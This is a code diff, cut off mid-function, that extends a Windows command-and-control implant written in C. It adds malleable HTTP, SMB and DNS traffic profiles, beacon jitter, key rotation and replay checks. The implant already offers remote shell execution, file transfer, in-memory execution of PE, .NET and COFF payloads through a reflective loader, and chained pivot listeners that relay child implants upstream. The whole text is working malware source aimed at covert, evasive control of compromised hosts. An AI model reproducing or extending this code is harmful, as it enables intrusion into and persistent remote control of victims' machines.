@@ -15,6 +15,7 @@
 #include "transport.h"
 #include "reflective_loader.h"
 #include "reflective_loader_shellcode.h"
+#include "malleable_profile.h"
 
 #if defined(_MSC_VER) || defined(__BORLANDC__)
 #pragma comment(lib,"Ws2_32.lib")
@@ -29,6 +30,10 @@ void https_set_shell_active(transport_conn_t *conn, int active);
 
 #define IS_HTTP (strcmp(UPSTREAM_TRANSPORT, "http") == 0)
 #define IS_HTTPS (strcmp(UPSTREAM_TRANSPORT, "https") == 0)
+#define IS_DNS (strcmp(UPSTREAM_TRANSPORT, "dns") == 0)
+
+extern char g_dns_domain[256];
+extern int  g_dns_poll_ms;
 
 enum {
     OPCODE_LEN = 6,
@@ -47,20 +52,23 @@ CRITICAL_SECTION send_mutex;
 char current_id[ID_LEN] = {0};
 char father_id[ID_LEN] = {0};
 
-static uint8_t key_enc[KEY_LEN];
-static uint8_t base_iv[NONCE_LEN];
-static uint8_t chain_key[KEY_LEN];
+static uint8_t key_tx[KEY_LEN];
+static uint8_t iv_tx[NONCE_LEN];
+static uint8_t ck_tx[KEY_LEN];
 static dr_ctr_t tx_ctr = 0;
-static dr_ctr_t rx_ctr = 0;
+static uint64_t tx_epoch = 0;
+
+static uint8_t key_rx[KEY_LEN];
+static uint8_t iv_rx[NONCE_LEN];
+static uint8_t ck_rx[KEY_LEN];
+static uint64_t rx_epoch = 0;
+static uint64_t last_rx_ctr = UINT64_MAX;
 
 static uint8_t key_enc_father[KEY_LEN];
 static uint8_t base_iv_father[NONCE_LEN];
-//used in future
 static dr_ctr_t tx_ctr_father = 0;
 static dr_ctr_t rx_ctr_father = 0;
 
-static dr_ctr_t tx_ctr_shell = 0;
-static dr_ctr_t rx_ctr_shell = 0;
 
 //uploads variables
 static FILE     *g_upload_fp    = NULL;
@@ -90,6 +98,9 @@ typedef struct {
     transport_t      *trans;
 } ExecMemCtx;
 
+#include "dotnet_exec.h"
+#include "coff_loader.h"
+
 enum PacketOpcode {
     OPCODE_INIT = 0x00,
     OPCODE_BEACON = 0x01,
@@ -110,6 +121,7 @@ enum PacketOpcode {
     OPCODE_HANDSHAKE_PUBKEY = 0x10,
     OPCODE_HANDSHAKE_ACK = 0x11,
     OPCODE_CLIENT_ID_ASSIGN = 0x12,
+    OPCODE_CLIENT_HANDSHAKE = 0x13,
     OPCODE_FILE_DOWNLOAD_REQ   = 0x14,
     OPCODE_FILE_DOWNLOAD_CHUNK = 0x15,
     OPCODE_FILE_DOWNLOAD_END   = 0x16,
@@ -118,7 +130,8 @@ enum PacketOpcode {
     OPCODE_FILE_UPLOAD_END = 0x19,
     OPCODE_EXEC_MEM_START = 0x1B,
     OPCODE_EXEC_MEM_CHUNK = 0x1C,
-    OPCODE_EXEC_MEM_ARGS  = 0x1D
+    OPCODE_EXEC_MEM_ARGS  = 0x1D,
+    OPCODE_LISTENER_ACK = 0x1E
 };
 
 typedef struct RouteTable {
@@ -130,6 +143,8 @@ typedef struct RouteTable {
     uint8_t base_iv[NONCE_LEN];
     dr_ctr_t* tx_ctr;
     dr_ctr_t* rx_ctr;
+    malleable_profile_t child_profile;
+    int child_profile_received;
     struct RouteTable* next;
 } RouteTable;
 
@@ -139,12 +154,15 @@ RouteTable* routing_table = NULL;
 CRITICAL_SECTION routing_table_mutex;
 
 typedef struct ListenerNode {
+    char name[32];
     transport_t *trans;
     int listen_fd;
     int port;
     HANDLE thread;
     transport_conn_t *client_conn;
     HANDLE client_thread;
+    malleable_profile_t profile;
+    int profile_loaded;
     struct ListenerNode* next;
 } ListenerNode;
 
@@ -193,11 +211,45 @@ typedef struct PendingRoute {
     CONDITION_VARIABLE route_ready;
     BOOL route_assigned;
     char assigned_id[ID_LEN];
+    malleable_profile_t child_profile;
+    int child_profile_received;
     struct PendingRoute* next;
 } PendingRoute;
 
 PendingRoute* pending_list = NULL;
 CRITICAL_SECTION pending_list_mutex;
+
+void http_apply_profile(const char *user_agent, const char *content_type, const char *path_data, const char *path_hs, const char *extra_headers);
+void https_apply_profile(const char *user_agent, const char *content_type, const char *path_data, const char *path_hs, const char *extra_headers);
+void smb_apply_pipe_name(const char *name);
+void http_server_set_listener_profile(int listen_fd, const malleable_profile_t *prof);
+void https_server_set_listener_profile(int listen_fd, const malleable_profile_t *prof);
+void http_set_padding(uint16_t pad_min, uint16_t pad_max);
+void https_set_padding(uint16_t pad_min, uint16_t pad_max);
+void tcp_set_padding(uint16_t pad_min, uint16_t pad_max);
+void smb_set_padding(uint16_t pad_min, uint16_t pad_max);
+
+static uint16_t g_beacon_interval_s = BEACON_INTERVAL;
+static uint8_t  g_jitter_pct        = JITTER_PCT;
+static uint16_t g_reconnect_delay_ms = RECONNECT_DELAY_MS;
+
+/* -------------------------------------------------------------------
+ * build_local_profile - populates a malleable_profile_t from
+ * compile-time.
+ * ------------------------------------------------------------------- */
+static void build_local_profile(malleable_profile_t *p)
+{
+    memset(p, 0, sizeof(*p));
+    p->beacon_interval_s  = (uint16_t)BEACON_INTERVAL;
+    p->jitter_pct         = (uint8_t)JITTER_PCT;
+    p->reconnect_delay_ms = (uint16_t)RECONNECT_DELAY_MS;
+    strncpy(p->http_user_agent,    HTTP_USER_AGENT_CFG,    MP_USER_AGENT_MAX - 1);
+    strncpy(p->http_content_type,  HTTP_CONTENT_TYPE_CFG,  MP_CONTENT_TYPE_MAX - 1);
+    strncpy(p->http_path_data,     HTTP_PATH_DATA_CFG,     MP_PATH_MAX - 1);
+    strncpy(p->http_path_hs,       HTTP_PATH_HS_CFG,       MP_PATH_MAX - 1);
+    strncpy(p->http_extra_headers, HTTP_EXTRA_HEADERS_CFG, MP_EXTRA_HEADERS_MAX - 1);
+    strncpy(p->smb_pipe_name,      SMB_PIPE_NAME, MP_PIPE_NAME_MAX - 1);
+}
 
 /* =========================================================================
  * abort_pending
@@ -282,24 +334,110 @@ int send_packet(
         transport_conn_t *conn,
         transport_t *trans,
         PACKET_DRAGON *packet,
-        const uint8_t key_enc[KEY_LEN],
-        const uint8_t base_iv[NONCE_LEN],
+        uint8_t key[KEY_LEN],
+        const uint8_t iv[NONCE_LEN],
+        dr_ctr_t *tx_ctr,
+        uint8_t ck[KEY_LEN],
+        uint64_t *epoch)
+{
+    uint8_t plain[PLAINTEXT_SIZE] = {0};
+    serialize_packet(packet, (char*)plain);
+
+    uint8_t wire[WIRE_FRAME_SIZE];
+    EnterCriticalSection(&send_mutex);
+    if (dragon_encrypt_frame(key, iv, tx_ctr, plain, wire) != 0) {
+        fprintf(stderr, "[CRYPTO] encrypt failed\n");
+        LeaveCriticalSection(&send_mutex);
+        return -1;
+    }
+    size_t sent = 0;
+    while (sent < WIRE_FRAME_SIZE) {
+        int n = trans->send(conn, (const char*)wire + sent, WIRE_FRAME_SIZE - sent);
+        if (n <= 0) {
+            LeaveCriticalSection(&send_mutex);
+            return -1;
+        }
+        sent += (size_t)n;
+    }
+
+    /* rekey check */
+    uint64_t cur = atomic_load(tx_ctr) - 1;
+    uint64_t new_ep = cur / REKEY_INTERVAL;
+    while (*epoch < new_ep) {
+        dragon_rekey(key, ck);
+        (*epoch)++;
+    }
+    LeaveCriticalSection(&send_mutex);
+    return 0;
+}
+
+/* =========================================================================
+ * send_packet_simple
+ *
+ * ====================================================================== */
+
+int send_packet_simple(
+        transport_conn_t *conn,
+        transport_t *trans,
+        PACKET_DRAGON *packet,
+        const uint8_t key[KEY_LEN],
+        const uint8_t iv[NONCE_LEN],
         dr_ctr_t *tx_ctr)
 {
     uint8_t plain[PLAINTEXT_SIZE] = {0};
     serialize_packet(packet, (char*)plain);
 
-    uint8_t frame[FRAME_SIZE];
+    uint8_t wire[WIRE_FRAME_SIZE];
     EnterCriticalSection(&send_mutex);
-    if (dragon_encrypt_frame(key_enc, base_iv, tx_ctr, plain, frame) != 0) {
-        fprintf(stderr, "[CRYPTO] encrypt failed\n");
+    if (dragon_encrypt_frame(key, iv, tx_ctr, plain, wire) != 0) {
         LeaveCriticalSection(&send_mutex);
         return -1;
     }
-    int r = trans->send(conn, frame, FRAME_SIZE);
+    size_t sent = 0;
+    while (sent < WIRE_FRAME_SIZE) {
+        int n = trans->send(conn, (const char*)wire + sent, WIRE_FRAME_SIZE - sent);
+        if (n <= 0) {
+            LeaveCriticalSection(&send_mutex);
+            return -1;
+        }
+        sent += (size_t)n;
+    }
     LeaveCriticalSection(&send_mutex);
-    if (r != FRAME_SIZE) return -1;
     return 0;
+}
+
+/* -------------------------------------------------------------------
+ * send_profile - builds PACKET_DRAGON with opcode 0x50.
+ * ------------------------------------------------------------------- */
+static int send_profile(transport_conn_t *conn, transport_t *trans,
+                        uint8_t *key, uint8_t *iv,
+                        dr_ctr_t *tx_ctr,
+                        uint8_t *ck, uint64_t *epoch,
+                        int use_simple)
+{
+    malleable_profile_t prof;
+    build_local_profile(&prof);
+
+    PACKET_DRAGON pkt;
+    memset(&pkt, 0, sizeof(pkt));
+    strncpy(pkt.opCode, OPCODE_PROFILE, sizeof(pkt.opCode) - 1);
+    if (profile_serialize(&prof, (uint8_t *)pkt.payload, &pkt.payload_size) != 0) {
+        printf("[ERROR] profile_serialize failed\n");
+        return -1;
+    }
+
+    int ret;
+    if (use_simple) {
+        ret = send_packet_simple(conn, trans, &pkt, key, iv, tx_ctr);
+    } else {
+        ret = send_packet(conn, trans, &pkt, key, iv, tx_ctr, ck, epoch);
+    }
+    if (ret == 0)
+        printf("[PROFILE] Sent profile (beacon=%us jitter=%u%%)\n",
+               prof.beacon_interval_s, prof.jitter_pct);
+    else
+        printf("[ERROR] Failed to send profile\n");
+    return ret;
 }
 
 /* =========================================================================
@@ -314,20 +452,23 @@ int send_packet_route(PACKET_DRAGON *packet, RouteTable *route) {
     uint8_t plain[PLAINTEXT_SIZE] = {0};
     serialize_packet(packet, (char *)plain);
 
-    uint8_t frame[FRAME_SIZE];
+    uint8_t wire[WIRE_FRAME_SIZE];
     EnterCriticalSection(&send_mutex);
-    if (dragon_encrypt_frame(route->key_enc, route->base_iv, route->tx_ctr, plain, frame) != 0) {
+    if (dragon_encrypt_frame(route->key_enc, route->base_iv,
+                             route->tx_ctr, plain, wire) != 0) {
         fprintf(stderr, "[CRYPTO] encrypt failed (route)\n");
+        LeaveCriticalSection(&send_mutex);
         return -1;
     }
     size_t sent = 0;
-    while (sent < FRAME_SIZE) {
-        int n = route->trans->send(route->conn, (const char*)frame + sent, FRAME_SIZE - sent);
+    while (sent < WIRE_FRAME_SIZE) {
+        int n = route->trans->send(route->conn,
+                (const char*)wire + sent, WIRE_FRAME_SIZE - sent);
         if (n <= 0) {
             LeaveCriticalSection(&send_mutex);
             return -1;
         }
-        sent += n;
+        sent += (size_t)n;
     }
     LeaveCriticalSection(&send_mutex);
     return 0;
@@ -343,9 +484,11 @@ int send_packet_route(PACKET_DRAGON *packet, RouteTable *route) {
  * Returns 0 on success, negative on failure.
  * ====================================================================== */
 
-static int two_layer_send(transport_conn_t *conn, transport_t *trans, const char *op, const void *buf, uint16_t len) {
-    const size_t TAG = crypto_aead_chacha20poly1305_ietf_ABYTES;
-    if (len + TAG > sizeof(((PACKET_DRAGON*)0)->payload))
+int two_layer_send(transport_conn_t *conn, transport_t *trans,
+                          const char *op, const void *buf, uint16_t len)
+{
+    const size_t BLOB_OVERHEAD = TAG_LEN + CTR_HDR;
+    if (len + BLOB_OVERHEAD > sizeof(((PACKET_DRAGON*)0)->payload))
         return -1;
 
     PACKET_DRAGON pkt = {0};
@@ -358,31 +501,27 @@ static int two_layer_send(transport_conn_t *conn, transport_t *trans, const char
 
     if (LEVEL_CLIENT == 1) {
         pkt.payload_size = len;
-        return send_packet(conn, trans, &pkt, key_enc, base_iv, &tx_ctr);
+        return send_packet(conn, trans, &pkt, key_tx, iv_tx,
+                           &tx_ctr, ck_tx, &tx_epoch);
     }
 
     uint16_t blob_len;
     if (len == 0) {
         uint8_t dummy = 0;
-        if (dragon_encryption_blob(key_enc, base_iv, &tx_ctr, &dummy, 0,
+        if (dragon_encryption_blob(key_tx, iv_tx, &tx_ctr,
+                                   &dummy, 0,
                                    (uint8_t*)pkt.payload, &blob_len) != 0)
             return -2;
-        pkt.payload_size = blob_len;
-    } else if (strncmp(op, "0x05", OPCODE_LEN) == 0) {
-        if (dragon_encryption_blob(key_enc, base_iv, &tx_ctr_shell,
-                                   (uint8_t*)pkt.payload, len,
-                                   (uint8_t*)pkt.payload, &blob_len) != 0)
-            return -2;
-        pkt.payload_size = blob_len;
     } else {
-        if (dragon_encryption_blob(key_enc, base_iv, &tx_ctr,
-                                   (uint8_t*)pkt.payload, len,
+        if (dragon_encryption_blob(key_tx, iv_tx, &tx_ctr,
+                                   (uint8_t*)buf, len,
                                    (uint8_t*)pkt.payload, &blob_len) != 0)
             return -2;
-        pkt.payload_size = blob_len;
     }
+    pkt.payload_size = blob_len;
 
-    return send_packet(conn, trans, &pkt, key_enc_father, base_iv_father, &tx_ctr_father);
+    return send_packet_simple(conn, trans, &pkt,
+                              key_enc_father, base_iv_father, &tx_ctr_father);
 }
 
 /* =========================================================================
@@ -397,31 +536,64 @@ int receive_packet(
         transport_conn_t *conn,
         transport_t *trans,
         PACKET_DRAGON *pkt,
-        const uint8_t key_enc[KEY_LEN],
-        const uint8_t base_iv[NONCE_LEN],
-        dr_ctr_t *rx_ctr)
+        uint8_t key[KEY_LEN],
+        const uint8_t iv[NONCE_LEN],
+        uint8_t ck[KEY_LEN],
+        uint64_t *epoch,
+        uint64_t *last_ctr)
 {
+    uint8_t wire[WIRE_FRAME_SIZE];
+    if (!recv_all(conn, trans, wire, WIRE_FRAME_SIZE)) return -1;
 
-    uint8_t frame[FRAME_SIZE];
-    if (!recv_all(conn, trans, frame, FRAME_SIZE)) {
-        fprintf(stderr, "[ERROR] frame recv_all failed\n");
-        return -1;
+    uint64_t wire_ctr;
+    memcpy(&wire_ctr, wire, CTR_HDR);
+
+    if (*last_ctr != UINT64_MAX && wire_ctr <= *last_ctr) {
+        fprintf(stderr, "[REPLAY] ctr %lu <= %lu\n",
+                (unsigned long)wire_ctr, (unsigned long)*last_ctr);
+        return -2;
     }
 
-    uint8_t plain[PLAINTEXT_SIZE];
+    
     EnterCriticalSection(&ctr_mutex);
-    if (dragon_decrypt_frame(key_enc, base_iv, rx_ctr, frame, plain) != 0) {
+    uint8_t plain[PLAINTEXT_SIZE];
+    if (dragon_decrypt_frame(key, iv, wire, plain, NULL) != 0) {
         LeaveCriticalSection(&ctr_mutex);
-        fprintf(stderr, "[ERROR] decrypt failed\n");
         return -1;
+    }
+    uint64_t new_ep = wire_ctr / REKEY_INTERVAL;
+    while (*epoch < new_ep) {
+        dragon_rekey(key, ck);
+        (*epoch)++;
     }
     LeaveCriticalSection(&ctr_mutex);
 
-    if (deserialize_packet(pkt, (char*)plain) != 0) {
-        fprintf(stderr, "[ERROR] deserialize failed\n");
-        return -1;
-    }
-    return 0;
+    *last_ctr = wire_ctr;
+    return deserialize_packet(pkt, (char*)plain);
+}
+
+/* =========================================================================
+ * receive_packet_simple
+ *
+ * Receives a full encrypted frame from the transport, decrypts it,
+ * and deserializes into a PACKET_DRAGON. Blocks until a complete
+ * frame arrives. Returns 0 on success, -1 on failure.
+ * ====================================================================== */
+
+int receive_packet_simple(
+        transport_conn_t *conn,
+        transport_t *trans,
+        PACKET_DRAGON *pkt,
+        const uint8_t key[KEY_LEN],
+        const uint8_t iv[NONCE_LEN])
+{
+    uint8_t wire[WIRE_FRAME_SIZE];
+    if (!recv_all(conn, trans, wire, WIRE_FRAME_SIZE)) return -1;
+
+    uint8_t plain[PLAINTEXT_SIZE];
+    if (dragon_decrypt_frame(key, iv, wire, plain, NULL) != 0) return -1;
+
+    return deserialize_packet(pkt, (char*)plain);
 }
 
 /* =========================================================================
@@ -434,7 +606,8 @@ int receive_packet(
 
 void add_route_entry_full(const char *client_id, transport_conn_t *conn, transport_t *trans, int port,
     const uint8_t key_enc[KEY_LEN], const uint8_t base_iv[NONCE_LEN],
-    dr_ctr_t* tx_ctr, dr_ctr_t* rx_ctr)
+    dr_ctr_t* tx_ctr, dr_ctr_t* rx_ctr,
+    const malleable_profile_t *profile, int profile_received)
 {
     RouteTable *entry = malloc(sizeof(RouteTable));
     if (!entry) return;
@@ -446,6 +619,12 @@ void add_route_entry_full(const char *client_id, transport_conn_t *conn, transpo
     memcpy(entry->base_iv, base_iv, NONCE_LEN);
     entry->tx_ctr = tx_ctr;
     entry->rx_ctr = rx_ctr;
+    if (profile && profile_received) {
+        memcpy(&entry->child_profile, profile, sizeof(malleable_profile_t));
+        entry->child_profile_received = 1;
+    } else {
+        entry->child_profile_received = 0;
+    }
     entry->next   = routing_table;
     routing_table = entry;
 }
@@ -485,7 +664,7 @@ static void send_shell_data(transport_conn_t *conn, transport_t *trans,
                              const char *buf, size_t len)
 {
     const size_t TAG_BYTES = crypto_aead_chacha20poly1305_ietf_ABYTES;
-    const size_t MAX_CLEAR = sizeof(((PACKET_DRAGON*)0)->payload) - TAG_BYTES;
+    const size_t MAX_CLEAR = sizeof(((PACKET_DRAGON*)0)->payload) - TAG_BYTES - CTR_HDR;
     while (len) {
         size_t chunk = (len > MAX_CLEAR) ? MAX_CLEAR : len;
         if (two_layer_send(conn, trans, "0x05", buf, (uint16_t)chunk) != 0) {
@@ -727,7 +906,7 @@ void execute_command(const char *cmd, transport_conn_t *conn, transport_t *trans
     CloseHandle(hWrite);
 
     const size_t TAG      = crypto_aead_chacha20poly1305_ietf_ABYTES;
-    const size_t MAX_CLEAR = sizeof(((PACKET_DRAGON*)0)->payload) - TAG;
+    const size_t MAX_CLEAR = sizeof(((PACKET_DRAGON*)0)->payload) - TAG - CTR_HDR;
     DWORD bytesRead;
     char  buffer[2040];
 
@@ -770,7 +949,12 @@ DWORD WINAPI sendBeacons(LPVOID data) {
     transport_conn_t *conn  = ctx->conn;
     transport_t      *trans = ctx->trans;
     while (1) {
-        Sleep(BEACON_INTERVAL * 1000);
+        int base_ms = g_beacon_interval_s * 1000;
+        int jitter_range = (base_ms * g_jitter_pct) / 100;
+        int jitter = jitter_range > 0
+            ? (int)(randombytes_uniform((uint32_t)(2 * jitter_range + 1))) - jitter_range
+            : 0;
+        Sleep(base_ms + jitter);
         if (two_layer_send(conn, trans, "0x01", NULL, 0) != 0)
             printf("[ERROR] beacon send failed\n");
     }
@@ -784,11 +968,11 @@ DWORD WINAPI sendBeacons(LPVOID data) {
  * listener exists on that port. Thread-safe.
  * ====================================================================== */
 
-ListenerNode *find_listener_by_port(int port) {
+ListenerNode *find_listener_by_name(const char *name) {
     EnterCriticalSection(&listener_list_mutex);
     ListenerNode *curr = listener_list;
     while (curr) {
-        if (curr->port == port) {
+        if (strcmp(curr->name, name) == 0) {
             LeaveCriticalSection(&listener_list_mutex);
             return curr;
         }
@@ -808,10 +992,13 @@ ListenerNode *find_listener_by_port(int port) {
 
 static int consume_handshake_blob(const PACKET_DRAGON *pkt) {
     uint8_t dummy[sizeof(pkt->payload)];
-    if (dragon_decrypt_payload(key_enc, base_iv, &rx_ctr,
-                               (const uint8_t*)pkt->payload,
-                               pkt->payload_size, dummy) != 0) {
-        printf("[ERROR] Handshake blob decrypt failed (opcode %s)\n", pkt->opCode);
+    uint16_t dummy_len;
+    if (dragon_decrypt_blob(key_rx, iv_rx,
+                            (const uint8_t*)pkt->payload,
+                            pkt->payload_size,
+                            dummy, &dummy_len) != 0) {
+        printf("[ERROR] Handshake blob decrypt failed (opcode %s)\n",
+               pkt->opCode);
         return -1;
     }
     return 0;
@@ -837,8 +1024,8 @@ static char *get_listeners_text(void) {
     }
     while (n) {
         int w = snprintf(buf + used, cap - used,
-                         "Type: %s - Port: %d (occupied? %s)\n",
-                         n->trans->name, n->port,
+                         "Name: %s - Type: %s - Port: %d (occupied? %s)\n",
+                         n->name, n->trans->name, n->port,
                          n->client_conn ? "YES" : "NO");
         if (w < 0) break;
         if ((size_t)w >= cap - used) { used = cap - 1; break; }
@@ -862,7 +1049,7 @@ static void fragment_and_send(transport_conn_t *conn, transport_t *trans,
                                const char *op, const char *text)
 {
     const size_t TAG      = crypto_aead_chacha20poly1305_ietf_ABYTES;
-    const size_t MAX_CLEAR = sizeof(((PACKET_DRAGON*)0)->payload) - TAG;
+    const size_t MAX_CLEAR = sizeof(((PACKET_DRAGON*)0)->payload) - TAG - CTR_HDR;
     size_t len  = strnlen(text, ROUTES_TEXT_BUFSIZE);
     size_t sent = 0;
     while (sent < len) {
@@ -978,6 +1165,23 @@ DWORD WINAPI listener_thread(LPVOID arg) {
         InitializeConditionVariable(&pending->route_ready);
         pending->route_assigned = FALSE;
         pending->assigned_id[0] = '\0';
+
+        pending->child_profile_received = 0;
+        PACKET_DRAGON prof_pkt = {0};
+        if (receive_packet_simple(conn, node->trans, &prof_pkt, key_enc_sub, base_iv_sub) == 0 && strncmp(prof_pkt.opCode, OPCODE_PROFILE, 6) == 0)
+        {
+            if (profile_deserialize((uint8_t *)prof_pkt.payload,
+                                    prof_pkt.payload_size,
+                                    &pending->child_profile) == 0) {
+                pending->child_profile_received = 1;
+                printf("[LISTENER] Received profile from child\n");
+                profile_dump(&pending->child_profile);
+            } else {
+                printf("[LISTENER] Failed to deserialize child profile\n");
+            }
+        } else {
+            printf("[LISTENER] Expected 0x50 profile from child\n");
+        }
  
         EnterCriticalSection(&pending_list_mutex);
         pending->next = pending_list;
@@ -991,7 +1195,7 @@ DWORD WINAPI listener_thread(LPVOID arg) {
         packet.payload_size = (uint16_t)strlen(packet.payload);
         packet.target_level = 1;
  
-        if (send_packet(conn, node->trans, &packet,
+        if (send_packet_simple(conn, node->trans, &packet,
                         key_enc_sub, base_iv_sub, pending->tx_ctr) < 0) {
             abort_pending(pending, node, conn); continue;
         }
@@ -999,8 +1203,8 @@ DWORD WINAPI listener_thread(LPVOID arg) {
  
         /* -- Riceive 0x00 from child (MAC|father_id|port) -- */
         memset(&packet, 0, sizeof(packet));
-        if (receive_packet(conn, node->trans, &packet,
-                           key_enc_sub, base_iv_sub, pending->rx_ctr) != 0
+        if (receive_packet_simple(conn, node->trans, &packet,
+                           key_enc_sub, base_iv_sub) != 0
             || strncmp(packet.opCode, "0x00", OPCODE_LEN) != 0) {
             abort_pending(pending, node, conn); continue;
         }
@@ -1008,14 +1212,14 @@ DWORD WINAPI listener_thread(LPVOID arg) {
  
         /* -- Forwarding 0x00 upstream -- */
         if (LEVEL_CLIENT > 1) {
-            if (send_packet(upstream_conn, upstream_trans, &packet,
+            if (send_packet_simple(upstream_conn, upstream_trans, &packet,
                             key_enc_father, base_iv_father,
                             &tx_ctr_father) < 0) {
                 abort_pending(pending, node, conn); continue;
             }
         } else {
             if (send_packet(upstream_conn, upstream_trans, &packet,
-                            key_enc, base_iv, &tx_ctr) < 0) {
+                            key_tx, iv_tx, &tx_ctr, ck_tx, &tx_epoch) < 0) {
                 abort_pending(pending, node, conn); continue;
             }
         }
@@ -1049,8 +1253,8 @@ DWORD WINAPI listener_thread(LPVOID arg) {
  
         /* -- Receive 0x10 from child (ephimeral pubkey for ECDH with server) -- */
         memset(&packet, 0, sizeof(packet));
-        if (receive_packet(conn, node->trans, &packet,
-                           key_enc_sub, base_iv_sub, pending->rx_ctr) != 0
+        if (receive_packet_simple(conn, node->trans, &packet,
+                           key_enc_sub, base_iv_sub) != 0
             || strncmp(packet.opCode, "0x10", OPCODE_LEN) != 0) {
             printf("[LISTENER] 0x10 waited but not received\n");
             node->trans->close(conn);
@@ -1066,7 +1270,7 @@ DWORD WINAPI listener_thread(LPVOID arg) {
  
         /* -- Forward 0x10 upstream -- */
         if (LEVEL_CLIENT > 1) {
-            if (send_packet(upstream_conn, upstream_trans, &packet,
+            if (send_packet_simple(upstream_conn, upstream_trans, &packet,
                             key_enc_father, base_iv_father,
                             &tx_ctr_father) < 0) {
                 printf("[LISTENER] forwarding 0x10 upstream FAILED\n");
@@ -1078,7 +1282,7 @@ DWORD WINAPI listener_thread(LPVOID arg) {
             }
         } else {
             if (send_packet(upstream_conn, upstream_trans, &packet,
-                            key_enc, base_iv, &tx_ctr) < 0) {
+                            key_tx, iv_tx, &tx_ctr, ck_tx, &tx_epoch) < 0) {
                 printf("[LISTENER] forwarding 0x10 upstream FAILED\n");
                 node->trans->close(conn);
                 node->client_conn = NULL;
@@ -1091,8 +1295,8 @@ DWORD WINAPI listener_thread(LPVOID arg) {
  
         /* -- Receive 0x13 from child (confirming handshake with server) -- */
         memset(&packet, 0, sizeof(packet));
-        if (receive_packet(conn, node->trans, &packet,
-                           key_enc_sub, base_iv_sub, pending->rx_ctr) != 0
+        if (receive_packet_simple(conn, node->trans, &packet,
+                           key_enc_sub, base_iv_sub) != 0
             || strncmp(packet.opCode, "0x13", OPCODE_LEN) != 0) {
             printf("[LISTENER] 0x13 not received\n");
             node->trans->close(conn);
@@ -1111,7 +1315,7 @@ DWORD WINAPI listener_thread(LPVOID arg) {
  
         /* -- Forward 0x13 upstream -- */
         if (LEVEL_CLIENT > 1) {
-            if (send_packet(upstream_conn, upstream_trans, &packet,
+            if (send_packet_simple(upstream_conn, upstream_trans, &packet,
                             key_enc_father, base_iv_father,
                             &tx_ctr_father) < 0) {
                 printf("[LISTENER] forward 0x13 upstream FAILED\n");
@@ -1123,7 +1327,7 @@ DWORD WINAPI listener_thread(LPVOID arg) {
             }
         } else {
             if (send_packet(upstream_conn, upstream_trans, &packet,
-                            key_enc, base_iv, &tx_ctr) < 0) {
+                            key_tx, iv_tx, &tx_ctr, ck_tx, &tx_epoch) < 0) {
                 printf("[LISTENER] forward 0x13 upstream FAILED\n");
                 node->trans->close(conn);
                 node->client_conn = NULL;
@@ -1141,25 +1345,23 @@ DWORD WINAPI listener_thread(LPVOID arg) {
         uint8_t  base_iv_down[NONCE_LEN];
         memcpy(key_enc_down, key_enc_sub,  KEY_LEN);
         memcpy(base_iv_down, base_iv_sub,  NONCE_LEN);
-        dr_ctr_t *rx_ctr_down = pending->rx_ctr;
  
         PACKET_DRAGON pkt;
         for (;;) {
-            if (receive_packet(conn, node->trans, &pkt,
-                               key_enc_down, base_iv_down,
-                               rx_ctr_down) != 0) {
+            if (receive_packet_simple(conn, node->trans, &pkt,
+                               key_enc_down, base_iv_down) != 0) {
                 printf("[RELAY] receive from child failed - disconnection\n");
                 break;
             }
             if (LEVEL_CLIENT > 1) {
-                if (send_packet(upstream_conn, upstream_trans, &pkt,
+                if (send_packet_simple(upstream_conn, upstream_trans, &pkt,
                                 key_enc_father, base_iv_father,
                                 &tx_ctr_father) != 0) {
                     printf("[RELAY] send to father failed\n"); break;
                 }
             } else {
                 if (send_packet(upstream_conn, upstream_trans, &pkt,
-                                key_enc, base_iv, &tx_ctr) != 0) {
+                                key_tx, iv_tx, &tx_ctr, ck_tx, &tx_epoch) != 0) {
                     printf("[RELAY] send to father failed\n"); break;
                 }
             }
@@ -1185,23 +1387,43 @@ DWORD WINAPI listener_thread(LPVOID arg) {
  * spawns listener_thread to handle incoming connections.
  * ====================================================================== */
 
-void add_listener(const char *transport_name, int port) {
+int add_listener(const char *transport_name, int port, const malleable_profile_t *prof, const char *name) {
     transport_t *trans = transport_get(transport_name);
-    if (!trans) { printf("[!] transport %s not found\n", transport_name); return; }
+    if (!trans) { printf("[!] transport %s not found\n", transport_name); return -1; }
+    if (prof && strcmp(transport_name, "smb") == 0)
+        smb_apply_pipe_name(prof->smb_pipe_name);
+
     int listen_fd = trans->listen(port);
-    if (listen_fd < 0) { printf("[!] listen failed (port %d)\n", port); return; }
+    if (listen_fd < 0) { printf("[!] listen failed (port %d)\n", port); return -1; }
+
+    if (prof) {
+        if (strcmp(transport_name, "http") == 0)
+            http_server_set_listener_profile(listen_fd, prof);
+        else if (strcmp(transport_name, "https") == 0)
+            https_server_set_listener_profile(listen_fd, prof);
+    }
     ListenerNode* node = malloc(sizeof(ListenerNode));
-    node->trans        = trans;
-    node->listen_fd    = listen_fd;
-    node->port         = port;
-    node->client_conn  = NULL;
-    node->client_thread= NULL;
+    memset(node, 0, sizeof(ListenerNode));
+    strncpy(node->name, name, sizeof(node->name) - 1);
+    node->trans = trans;
+    node->listen_fd = listen_fd;
+    node->port = port;
+    node->client_conn = NULL;
+    node->client_thread = NULL;
+    if (prof) {
+        memcpy(&node->profile, prof, sizeof(node->profile));
+        node->profile_loaded = 1;
+    } else {
+        memset(&node->profile, 0, sizeof(node->profile));
+        node->profile_loaded = 0;
+    }
     node->thread = CreateThread(NULL, 0, listener_thread, (LPVOID)node, 0, NULL);
     EnterCriticalSection(&listener_list_mutex);
-    node->next    = listener_list;
+    node->next = listener_list;
     listener_list = node;
     LeaveCriticalSection(&listener_list_mutex);
-    printf("[+] Listener active port %d\n", port);
+    printf("[+] Listener '%s' active port %d (profile: %s)\n", name, port, node->profile_loaded ? "yes" : "no");
+    return 0;
 }
 
 /* =========================================================================
@@ -1212,11 +1434,11 @@ void add_listener(const char *transport_name, int port) {
  * frees the ListenerNode. Thread-safe.
  * ====================================================================== */
 
-void remove_listener(int port) {
+void remove_listener(const char *name) {
     EnterCriticalSection(&listener_list_mutex);
     ListenerNode **curr = &listener_list;
     while (*curr) {
-        if ((*curr)->port == port) {
+        if (strcmp((*curr)->name, name) == 0) {
             ListenerNode* to_del = *curr;
             *curr = to_del->next;
             if (to_del->client_conn) {
@@ -1228,7 +1450,7 @@ void remove_listener(int port) {
                 CloseHandle(to_del->thread);
             }
             free(to_del);
-            printf("[-] Listener on port %d closed\n", port);
+            printf("[-] Listener '%s' closed\n", name);
             break;
         }
         curr = &((*curr)->next);
@@ -1419,13 +1641,12 @@ DWORD WINAPI exec_mem_thread(LPVOID arg)
 {
     ExecMemCtx *ctx = (ExecMemCtx*)arg;
  
-    if (pe_is_dotnet(ctx->pe_bytes)) {
